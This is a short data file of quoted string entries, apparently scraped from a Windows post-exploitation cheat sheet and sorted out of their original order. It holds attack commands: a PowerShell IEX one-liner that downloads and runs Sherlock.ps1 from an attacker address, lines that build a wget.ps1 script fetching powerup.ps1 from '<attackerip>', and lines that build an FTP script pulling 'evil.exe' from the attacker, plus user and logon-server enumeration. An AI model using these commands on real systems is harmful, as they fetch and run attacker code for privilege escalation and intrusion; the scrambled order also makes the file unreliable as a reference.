"('\n', ""IEX(New Object Net.WebClient).downloadString('http://<ip>:<port>/Sherlock.ps1') | powershell -noprofile -"")"
"('\n', '$file = ""powerup.ps1"" >>wget.ps1')"
"('\n', '$storageDir = $pwd > wget.ps1')"
"('\n', '$url = ""http://<attackerip>/powerup.ps1"" >>wget.ps1')"
"('\n', '$webclient = New-Object System.Net.WebClient >>wget.ps1')"
"('\n', '$webclient.DownloadFile($url,$file) >>wget.ps1')"
"('\n', '%logonserver%')"
"('\n', '%username%')"
"('\n', 'GET evil.exe >> ftp.txt')"
"('\n', 'USER username password >> ftp.txt')"
"('\n', 'bin >> ftp.txt')"
"('\n', 'bye >> ftp.txt')"
"('\n', 'open <attackerip> 21> ftp.txt')"
